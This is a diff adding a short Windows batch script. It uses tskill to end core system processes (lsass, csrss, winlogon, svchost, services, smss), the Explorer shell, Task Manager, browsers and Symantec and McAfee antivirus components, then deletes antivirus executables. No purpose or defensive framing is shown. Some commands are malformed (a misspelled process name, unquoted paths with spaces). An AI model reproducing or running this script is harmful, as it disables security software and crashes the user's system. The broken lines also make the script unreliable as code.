@@ -1,0 +1,18 @@
+tskill explorer
+tskill ccapp
+tskill firefox
+tskill iexplorer
+tskill System Idle Process
+tskill explorer.exe
+tskill taskmgr.exe
+tskill spoolsv.exe
+tskill lsass.exe
+tskill csrss.exe
+tskill smss.exe
+tskill winlogon.exe
+tskill svchost.exe
+tskill services.exe
+
+del C:\Program Files\Common Files\Symantec Shared\ccapp.exe 
+tskill McAfee Security Centre Module
+del c:\program files\mcafee.com\agent\mcdetect.exe 
